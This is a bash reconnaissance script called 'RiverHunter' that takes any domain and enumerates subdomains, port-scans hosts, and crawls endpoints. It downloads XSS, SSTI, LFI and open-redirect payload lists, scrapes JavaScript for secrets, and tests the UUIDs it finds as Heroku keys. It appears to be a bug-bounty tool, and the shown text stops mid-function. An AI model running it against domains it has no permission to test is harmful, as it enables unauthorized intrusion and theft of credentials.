#!/bin/bash
#Colors Output
NORMAL="\e[0m"			
RED="\033[0;31m" 		
GREEN="\033[0;32m"		   
BOLD="\033[01;01m"    	
WHITE="\033[1;37m"		
YELLOW="\033[1;33m"	
LRED="\033[1;31m"		
LGREEN="\033[1;32m"		
LBLUE="\033[1;34m"			
LCYAN="\033[1;36m"		
SORANGE="\033[0;33m"		      		
DGRAY="\033[1;30m"		
DSPACE="  "
CTAB="\t"
DTAB="\t\t"
TSPACE="   "
TTAB="\t\t\t"
QSPACE="    "
QTAB="\t\t\t\t"
BLINK="\e[5m"
TICK="\u2714"
CROSS="\u274c"
# Define the target domain
target=$1
dirdomain=$(printf $target | awk -F[.] '{print $1}')
mkdir -p "${dirdomain}/subdomains/.tmp"
mkdir -p "${dirdomain}"
mkdir -p "${dirdomain}/subdomains"
mkdir -p "${dirdomain}/osint"
mkdir -p "${dirdomain}/info"
mkdir -p "${dirdomain}/wordlists"
mkdir -p "${dirdomain}/fuzzing"
mkdir -p "${dirdomain}/parameters"
mkdir -p "${dirdomain}/vulnerability"
wordlists="${dirdomain}/wordlists"
iptxt="${dirdomain}/info/ip.txt"
report="${dirdomain}/report.html"
subdomains_file="${dirdomain}/subdomains/subdomains.txt"
subdomains_live="${dirdomain}/subdomains/livesubdomain.txt"
workspace="/usr/share/sniper/loot/workspace/${dirdomain}"
input_file=""
threads=100
url_file="${dirdomain}/parameters/endpoints.txt"
dns_wordlist=/root/Desktop/work/dns_wordlist.txt
xss_list="${dirdomain}/wordlists/xss-payloads.txt"
httpxpath="${dirdomain}/wordlists/httpxpath.txt"
cors_list=/root/tools/sec/Fuzzing/XSS/XSS-OFJAAAH.txt
ssti_list="${dirdomain}/wordlists/ssti_wordlist.txt"
lfi_list="${dirdomain}/wordlists/lfi_wordlist.txt"
report_xss="${dirdomain}/vulnerability/xss_vurls.txt"
fuzz_file=/root/tools/sec/Discovery/Web-Content/common.txt
report_cors="${dirdomain}/vulnerability/cors_vurls.txt"
report_lfi="${dirdomain}/vulnerability/lfi_vurls.txt"
report_ssti="${dirdomain}/vulnerability/ssti_vurls.txt"
prototype_file="${dirdomain}/vulnerability/prototype_vurls.txt"
openredirect_file="${dirdomain}/vulnerability/openredirect_vurls.txt"
PAYLOADS_FILE=/root/tools/sec/Discovery/Web-Content/Open-Redirect-payloads.txt
# Define the output directory
output_dir="output"
xss_file="${dirdomain}/parameters/xss.txt"
SCAN_PORT_NAABU_PORTS_LIST="1-65535"
tools=~/Tools
dns_resolver=$tools/wordlist/resolvers.txt
ports="21,22,23,25,53,69,80,88,110,115,123,137,139,143,161,179,194,389,443,445,465,500,546,547,587,636,993,994,995,1025,1080,1194,1433,1434,1521,1701,1723,1812,1813,2049,2222,2375,2376,3306,3389,3690,4443,5432,5800,5900,5938,5984,6379,6667,6881,8080,8443,8880,9090,9418,9999,10000,11211,15672,27017,28017,3030,33060,4848,5000,5433,5672,6666,8000,8081,8444,8888,8905,9000,9042,9160,9990,11210,12201,15674,18080,1965,1978,2082,2083,2086,2087,2089,2096,22611,25565,27018,28015,33389,4369,49152,54321,54322,55117,55555,55672,5666,5671,6346,6347,6697,6882,6883,6884,6885,6886,6887,6888,6889,8088,8089,9001,9415,17089,27019,34443,3659,45557,55556,5673,5674,6370,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,81,300,591,593,832,981,1010,1311,1099,2095,2480,3000,3128,3333,4242,4243,4567,4711,4712,4993,5104,5108,5280,5281,5601,5985,6543,7000,7001,7396,7474,8001,8008,8014,8042,8060,8069,8083,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8500,8184,8834,8983,9043,9060,9080,9091,9200,9443,9502,9800,9981,10250,11371,12443,16080,17778,18091,18092,20720,32000,55440,22222,32400"
printf "${GREEN} 
                        ⣿⣿⣿⣿⣿⣿⣿⣉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢿⣿⣿⣿⣿⣿⣿⡏⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣍⡙⢿⣿⣦⡙⠻⣿⣿⣿⡿⠁⣾⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠛⠓⠢⡈⢿⡿⠁⣸⣿⡿⠿⢋⣴⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣿⣿⣿⣿⣯⣍⣙⡋⠠⠄⠄⠄⠄⠁⠘⠁⠄⠴⠚⠻⢿⣿⣿⣿⣿⣿⣿⣿  <<  RiverHunter TOOL >>
                        ⣿⣿⣿⣿⣿⣿⣿⡿⠿⢏⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣿⣿⣿⣿  <<  CODED BY RiverHunter >>
                        ⣿⣿⣿⣿⣿⣧⡴⠖⠒⠄⠁⠄⢀⠄⠄⠄⡀⠄⠄⠄⠄⠄⠄⣠⣿⣿⣿⣿⣿⣿  <<  INSTAGRAM==>RiverHunter >>
                        ⣿⣿⣿⠿⠟⣩⣴⣶⣿⣿⣶⡞⠉⣠⣇⠄⣿⣶⣦⣄⡀⠲⢿⣿⣿⣿⣿⣿⣿⣿
                        ⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⡿⢠⣿⣿⣿⢀⣿⣿⣿⣿⣿⣿⣶⣌⠻⠿⣿⣿⣿⣿ 
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿ 
                        ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ \n
                        / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
                       ( R | e | v | e | r | H | u | n | t | e | r )
                        \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/   \n "
printf "          ${YELLOW}RiverHunter>${end}${GREEN} More Targets - More Options - More Opportunities${end}" | pv -qL 30
sleep 0.4
printf  "${NORMAL}\n[${BLINK}${CROSS}] ${NORMAL}${NORMAL}${LRED}Warning: Use with caution. You are responsible for your own actions.${NORMAL}\n"| pv -qL 30
printf  "${NORMAL}[${BLINK}${CROSS}] ${NORMAL}${LRED}Developers are not responsible for any misuse or damage cause by this tool.${NORMAL}\n"| pv -qL 30
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ !" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
printf "${GREEN}#######################################################################\n"
targetName="https://"$target
company=$(printf $dirdomain | awk -F[.] '{print $1}')
printf "${BOLD}${GREEN}[*] Time: ${YELLOW}${TSPACE}$(date "+%d-%m-%Y %H:%M:%S")${NORMAL}\n"
printf "${BOLD}${GREEN}[*] COMPANY:${YELLOW} $company ${NORMAL}\n"
printf "${BOLD}${GREEN}[*] Output:  ${YELLOW}$(pwd)/$dirdomain${NORMAL}\n"
printf "${BOLD}${GREEN}[*] TARGET URL:${YELLOW} $targetName ${NORMAL}\n"
ip_adress=$(dig +short $target | tr '\n' ' ' | sed 's/ $//')
printf "${BOLD}${GREEN}[*] TARGET IP : [${YELLOW}$ip_adress${NORMAL}]\n"
printf "${GREEN}#######################################################################\n"
# Create the output directory if it doesn't exist
check_and_download() {

    local file_path="$1"

    local download_url="$2"

    local file_name="${file_path##*/}"


    if [ -f "$file_path" ]; then

        printf ""

    else

        curl -# -o "$file_path" "$download_url"

        printf "Downloading $file_name.\n"

    fi

}

check_and_download "$wordlists/subdomain_megalist.txt" "https://raw.githubusercontent.com/netsecurity-as/subfuz/master/subdomain_megalist.txt"

check_and_download "$wordlists/resolvers.txt" "https://raw.githubusercontent.com/kh4sh3i/Fresh-Resolvers/master/resolvers.txt"
check_and_download "$wordlists/resolvers2.txt" "https://raw.githubusercontent.com/six2dez/resolvers_reconftw/main/resolvers.txt"
check_and_download "$wordlists/resolvers_trusted.txt" "https://raw.githubusercontent.com/six2dez/resolvers_reconftw/main/resolvers_trusted.txt"

check_and_download "$wordlists/ssti_wordlist.txt" "https://gist.githubusercontent.com/six2dez/ab5277b11da7369bf4e9db72b49ad3c1/raw"
check_and_download "$wordlists/lfi_wordlist.txt" "https://gist.githubusercontent.com/six2dez/a89a0c7861d49bb61a09822d272d5395/raw"
check_and_download "$wordlists/subs_wordlist.txt" "https://gist.github.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw"
check_and_download "$wordlists/httpxpath.txt" "https://raw.githubusercontent.com/abosameh/bug/main/httpxpath.txt"
check_and_download "$wordlists/ssti-payloads.txt" "https://raw.githubusercontent.com/abosameh/bug/main/ssti-payloads.txt"
check_and_download "$wordlists/xss-payloads.txt" "https://raw.githubusercontent.com/abosameh/bug/main/xss-payloads.txt"
check_and_download "$wordlists/Open-Redirect-payloads.txt" "https://raw.githubusercontent.com/abosameh/bug/main/Open-Redirect-payloads.txt"

# Function to scan for subdomains
scan_subdomains() {
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Starting subdomain enumeration for  ${YELLOW}$target${NORMAL}\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}subfinder${NORMAL}]"
    subfinder -silent -d $target -all -o ${dirdomain}/subdomains/subfinder.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}subfinder${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/subfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}assetfinder${NORMAL}]"
    assetfinder --subs-only $target | sort -u | anew -q ${dirdomain}/subdomains/assetfinder.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}assetfinder${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/assetfinder.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}findomain${NORMAL}]"
    findomain -r -q -t $target | anew -q ${dirdomain}/subdomains/findomain.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}findomain${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/findomain.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]"
    python3 ~/tools/Sublist3r/sublist3r.py -d $target -o ${dirdomain}/subdomains/sublister.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}sublist3r${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/sublister.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}amass${NORMAL}]"
    amass enum -passive -norecursive -d $target -o ${dirdomain}/subdomains/amass.txt &> /dev/null
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}amass${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/amass.txt 2> /dev/null | wc -l )"
    echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Certspo${NORMAL}]"
curl -s "https://api.certspotter.com/v1/issuances?domain=${target}&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sed 's/\*\.//g' | sort -u >> "${dirdomain}/subdomains/Certspotter.txt" 2>/dev/null 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Certspo${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Certspotter.txt 2> /dev/null | wc -l )"
 #   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}CertSH${NORMAL}]"
 #  curl -s https://crt.sh/?q\=%.${target}\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> ${dirdomain}/subdomains/CertSH.txt &> /dev/null
   
  # ~/tools/massdns/scripts/ct.py $target | anew -q ${dirdomain}/subdomains/CertSH.txt  &> /dev/null
 #   echo -e "\033[2A"
 #   echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}CertSH${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/CertSH.txt 2> /dev/null | wc -l )"  
     echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}RapidDNS${NORMAL}]"
  curl -s "https://rapiddns.io/subdomain/${target}?full=1#result" |grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" |grep ".${target}" | sort -u >> ${dirdomain}/subdomains/RapidDNS.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}RapidDNS${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/RapidDNS.txt 2> /dev/null | wc -l )"   
    
    

    
    
         echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Alienvault${NORMAL}]"
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/${target}/passive_dns" | jq --raw-output '.passive_dns[]?.hostname' | sort -u >> ${dirdomain}/subdomains/Alienvault.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Alienvault${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Alienvault.txt 2> /dev/null | wc -l )" 
    
    
             echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Hackertarget${NORMAL}]"
  curl -s "https://api.hackertarget.com/hostsearch/?q=${target}"|grep -o "\w.*${target}">> ${dirdomain}/subdomains/Hackertarget.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Hackertarget${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Hackertarget.txt 2> /dev/null | wc -l )" 
      
              echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}Urlscan${NORMAL}]"
  curl -s "https://urlscan.io/api/v1/search/?q=domain:${target}"|jq '.results[].page.domain' 2>/dev/null |grep -o "\w.*${target}"|sort -u >> ${dirdomain}/subdomains/Urlscan.txt
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Subdomain Scanned  -  ${NORMAL}[${GREEN}Urlscan${TICK}${NORMAL}]${TTAB} Subdomain Found: ${LGREEN}$(cat ${dirdomain}/subdomains/Urlscan.txt 2> /dev/null | wc -l )" 
 echo -ne "\n${NORMAL}${BOLD}${YELLOW}[●] Filtering Alive subdomains\r"
cat ${dirdomain}/subdomains/*.txt | anew -q ${dirdomain}/subdomains/subdomains.txt  
cat $subdomains_file |sort |uniq >> ${dirdomain}/subdomains/subdomains.txt
echo -ne "${NORMAL}${BOLD}${GREEN}[*] Subdomains Found - ${YELLOW}Total of ${NORMAL}${LRED}$(wc -l ${dirdomain}/subdomains/subdomains.txt | awk '{print $1}') ${BOLD}${YELLOW}Subdomains Found\n"
cat -s ${dirdomain}/subdomains/subdomains.txt | httpx-toolkit -p 443,80,8080,8000 -silent >> ${dirdomain}/subdomains/httpx.txt 
cat -s ${dirdomain}/subdomains/httpx.txt | grep -Eo "https?://[^/]+\.${target}" >> ${dirdomain}/subdomains/livesubdomain.txt 
cat -s ${dirdomain}/subdomains/subdomains.txt |httpx -sc -td -probe -title -location -fhr >> ${dirdomain}/subdomains/titlesubdomain.txt 
    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${GREEN}[*] Live Subdomains Found - ${YELLOW}Total of ${NORMAL}${LRED}$(wc -l ${dirdomain}/subdomains/livesubdomain.txt | awk '{print $1}') ${BOLD}${YELLOW} Live Subdomains Found\n"

}

# Function to get all endpoints
get_endpoints() {
    echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Starting Endpoints Scanning:${NORMAL}${BOLD} Getting all endpoints\r"
    echo -e "\n${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please wait while Getting all endpoints.This may take a while...${NORMAL}"
  waymore -i $target -mode U -oU $dirdomain/parameters/waymore.txt &> /dev/null
 # curl --silent "http://web.archive.org/cdx/search/cdx?url=*.${target}/*&output=text&fl=original&collapse=urlkey" > ${dirdomain}/parameters/WebArchive.txt &> /dev/null
   katana -silent -list ${dirdomain}/subdomains/livesubdomain.txt -o $dirdomain/parameters/katana.txt &> /dev/null
  cat ${dirdomain}/subdomains/livesubdomain.txt | gauplus --random-agent -b eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt -o ${dirdomain}/parameters/gauplus.txt &> /dev/null
   cat ${dirdomain}/subdomains/livesubdomain.txt | waybackurls | anew -q ${dirdomain}/parameters/waybackurls.txt &> /dev/null
 cat ${dirdomain}/subdomains/livesubdomain.txt | hakrawler | grep -Eo "https?://[^/]+\.${target}" | tee -a $dirdomain/parameters/hakrawler-urls.txt &> /dev/null
    cat ${dirdomain}/parameters/*.txt | sed '/\[/d' | grep $target | sort -u | urldedupe -s | anew -q ${dirdomain}/parameters/endpoints.txt &> /dev/null
   echo -ne "${NORMAL}${BOLD}${LGREEN}[●] Endpoints Scanning Completed for Subdomains of ${NORMAL}${BOLD}${RED}$target${RED}${WHITE}\t Total: ${GREEN}$(cat ${dirdomain}/parameters/endpoints.txt 2> /dev/null | wc -l )\n"
    echo -ne "${NORMAL}${BOLD}${YELLOW}[●] Endpoints Scanning:${NORMAL}${BOLD} Filtering all endpoints\r"
    cat ${dirdomain}/parameters/endpoints.txt | gf xss | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/xss.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf ssrf | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/ssrf.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/sqli.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/lfi.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf rce | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/rce.txt
    cat ${dirdomain}/parameters/endpoints.txt | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/redirect.txt 



    cat ${dirdomain}/parameters/endpoints.txt | gf ssti | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/ssti.txt
        cat ${dirdomain}/parameters/endpoints.txt | gf idor | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q ${dirdomain}/parameters/idor.txt
   echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] interesting data in site Checking  -  ${NORMAL}[${LRED}${BLINK}Checking${NORMAL}]"
   cat ${dirdomain}/parameters/endpoints.txt | gf interestingEXT | grep -viE '(\.(js|css|svg|png|jpg|woff))' | qsreplace -a | httpx -mc 200 -silent | awk '{ print $1}' > $dirdomain/info/interesting.txt

    echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] interesting data in site Checked  -  ${NORMAL}[${GREEN}Checking${TICK}${NORMAL}]${TTAB} interesting data: ${LGREEN}$(cat $dirdomain/info/interesting.txt 2> /dev/null | wc -l )"         
 echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Obtaining all the JavaScript files  -  ${NORMAL}[${LRED}${BLINK}Checking${NORMAL}]"
 cat ${dirdomain}/parameters/endpoints.txt | grep '\.js$' | httpx -mc 200 -content-type -silent | grep 'application/javascript' | awk -F '[' '{print $1}' | tee -a ${dirdomain}/info/js.txt &> /dev/null
 cat ${dirdomain}/parameters/endpoints.txt | httpx -mc 200 -ct -silent | grep application/json | tee -a ${dirdomain}/info/json.txt &> /dev/null

 echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Obtaining all the JavaScript files  -  ${NORMAL}[${GREEN}Checking${TICK}${NORMAL}]${TTAB} JavaScript files: ${LGREEN}$(cat ${dirdomain}/info/js.txt 2> /dev/null | wc -l )"   
    
  echo -ne "${NORMAL}${BOLD}${YELLOW}\n[*] Discovering sensitive data .  ${NORMAL}[${LRED}${BLINK}Checking${NORMAL}]"
for url in $(cat ${dirdomain}/info/js.txt);do
		python3 ~/tools/secretfinder/SecretFinder.py --input $url -o cli | tee -a $dirdomain/info/secret.txt
	done &> /dev/null
	cat ${dirdomain}/parameters/endpoints.txt | httpx -mc 200 -content-type -silent | awk -F '[' '{print $1}' | tee -a ${dirdomain}/parameters/liveendpoints.txt &> /dev/null
 for url in $(cat ${dirdomain}/parameters/liveendpoints.txt);do
		python3 ~/tools/secretfinder/SecretFinder.py --input $url -o cli | tee -a $dirdomain/info/secretendpoints.txt
	done &> /dev/null
	
 echo -e "\033[2A"
    echo -ne "${NORMAL}${BOLD}${SORANGE}\n[*] Discovering sensitive data  ${NORMAL}[${GREEN}Checking${TICK}${NORMAL}]${TTAB} JavaScript files: ${LGREEN}$(cat $dirdomain/info/secret.txt 2> /dev/null | wc -l )"      
             
}

# Function to get info of the domains
get_info() {
        
        echo -ne "${GREEN}[+] Whois Lookup${NORMAL}\n"	
	echo -ne "${NORMAL}${YELLOW}Searching domain name details, contact details of domain owner, domain name servers, netRange, domain dates, expiry records, records last updated...${NORMAL}\n\n"
	whois $target | grep 'Domain\|Registry\|Registrar\|Updated\|Creation\|Registrant\|Name Server\|DNSSEC:\|Status\|Whois Server\|Admin\|Tech' | grep -v 'the Data in VeriSign Global Registry' | tee ${dirdomain}/info/whois.txt
	
	echo -ne "\n${GREEN}[+] WhatWeb ${NORMAL}\n"
	echo -ne "${NORMAL}${YELLOW}Searching platform, type of script, google analytics, web server platform, IP address, country, server headers, cookies...${NORMAL}\n\n"
	whatweb -i $subdomains_live --log-brief ${dirdomain}/info/whatweb.txt &> /dev/null
echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Check if the Domains is running WordPress or Joomla or Drupal\r"
websites_file="$subdomains_live" 
CMSresult="./$dirdomain/info/CMSresult.txt"  
if [ ! -f "$websites_file" ]; then
    echo "Websites file not found: $websites_file"
    exit 1
fi
while IFS= read -r website; do
    html_content=$(curl -s "$website")        
    if echo "$html_content" | grep -q -E 'wp-content|wp-includes|wordpress|WordPress|Wordpress'; then
        cms="WordPress"
         if ! command -v wpscan &> /dev/null; then
            echo "wpscan is not installed. Please install it to scan WordPress sites."
        else
            wpscan --url "$website" >> "$CMSresult"
            echo "wpscan scan results appended to $CMSresult"
        fi
    elif echo "$html_content" | grep -q -E 'Joomla|joomla.xml'; then
        cms="Joomla"
    elif echo "$html_content" | grep -q -E 'shopify'; then
        cms="shopify"
    elif echo "$html_content" | grep -q -E 'hubspot'; then
        cms="hubspot"
    elif echo "$html_content" | grep -q -E 'weebly'; then
        cms="weebly"
     elif echo "$html_content" | grep -q -E 'wix'; then
        cms="wix"
      elif echo "$html_content" | grep -q -E 'moodle'; then
        cms="moodle"
      elif echo "$html_content" | grep -q -E 'prestashop'; then
        cms="prestashop"                   
    elif echo "$html_content" | grep -q -E 'Drupal|core/modules|composer/Plugin'; then
        cms="Drupal"
    else
        cms="Unknown"
    fi    
    if [ "$cms" != "Unknown" ]; then
        echo -ne "[+]${GREEN}$website${YELLOW} ========>is running $cms\n"
        echo -ne "$website ========>is running $cms" >> "$CMSresult"
    else
        echo -ne "${YELLOW}$website ${RED}Unknown\n"
    fi    
done < "$websites_file"
echo -ne "\n${NORMAL}${BOLD}${YELLOW}[*] Check which Server the Domains is running\r"
Serverresult="./$dirdomain/info/Serverresult.txt"
while IFS= read -r website; do
    html_content=$(curl -I "$website" 2>&1 | grep -i 'server:')
    if [ "$html_content" != "Unknown" ]; then
echo -ne "[+]${GREEN}$website${YELLOW}   running $html_content\n"
echo -ne "[+]${GREEN}$website${YELLOW}   running $html_content" >>"$Serverresult"
else
echo -ne "[+]${YELLOW}$website ${RED}Unknown."
    fi 
done < "$websites_file"

}


# Function to get IPs of subdomains
get_ips() {

 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #  
    echo "Getting IPs of subdomains..."
 cat ${dirdomain}/subdomains/subdomains.txt | dnsx -a --resp-only --silent | anew $iptxt  &> /dev/null
 cat ${dirdomain}/subdomains/subdomains.txt | dnsx -a --resp --silent | anew ${dirdomain}/info/domain_ips.txt   &> /dev/null 
 naabu -list $iptxt -p $ports -c 150 --silent -o ${dirdomain}/info/portscan.txt   
 #cat ${dirdomain}/info/whatweb.txt |grep -oP 'IP\[\K[^]]+' >> $iptxt
 #ports=$(cat ip.txt | naabu -silent -p 1-65535 | cut -d ':' -f 2 | anew |  tr '\n' ',' | sed s/,$//) && nmap -iL ip.txt -p 1-65535 -sV -Pn -sC --script='vulners, http-waf-detect, http-security-headers, dns-zone-transfer, http-cross-domain-policy, http-title, whois-ip' --script-args='mincvss=5.0' -oA nmap.txt --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl   
#   nmap -iL $iptxt -sC -sV -vv -oA ${dirdomain}/info/nmap.txt   
    
    
    
    
#    cat ${dirdomain}/subdomains/livesubdomain.txt | xargs -I{} sh -c 'host {} | grep "has address" | cut -d" " -f4' > ${dirdomain}/info/ips.txt
 #   echo "IPs saved to ips.txt"
 #   wordcount=$(wc -l $subdomains_live | grep -o '[0-9]\+')
#if [ "$wordcount" -gt 1200 ]; then
#:
#else
#echo -ne " ${BOLD}${GREEN}[+] We find ${BOLD}${RED}$wordcount${BOLD}${GREEN}active subdomains...Running Nmap on them${NORMAL}\n"
#fi
#grep -oE '(https?://)?([^/]+)' $subdomains_live | sed -E 's/https?:\/\///' > ${dirdomain}/info/scan.txt
#nmap -iL ${dirdomain}/info/scan.txt -A > ${dirdomain}/info/nmap.txt
#rm ${dirdomain}/info/scan.txt
}

# Function to check for vulnerabilities
check_vulnerabilities() {
printf "${NORMAL}${yellow}Gathering endpoints that they return 403 status code...${NORMAL}\n\n"
#  cat ${dirdomain}/parameters/endpoints.txt |  httpx -silent -sc -title | grep 403 | grep "$target" | cut -d' ' -f1 | tee ${dirdomain}/parameters/endpoints_403.txt

# 	printf "\n${NORMAL}${CYAN}Trying to bypass 403 status code...${NORMAL}\n\n"
# 	for url in $(cat $dirdomain/parameters/endpoints_403.txt);
# 	do

# 	      		bash /root/Desktop/work/403-bypass.sh -u $url --exploit 
# 	done
# 

 cat $dirdomain/info/secret.txt | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' |sort -u > $dirdomain/info/herko.txt
cat $dirdomain/info/secretendpoints.txt | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' |sort -u >> $dirdomain/info/herko.txt
 python3 /root/Desktop/work/Heroku.py $dirdomain/info/herko.txt
 
 
 echo $target | dnsgen - | anew -q ${dirdomain}/subdomains/generated-subdomains.txt 
  cat ${dirdomain}/subdomains/generated-subdomains.txt | httpx -t 100 --silent |anew  ${dirdomain}/subdomains/vivos.txt 
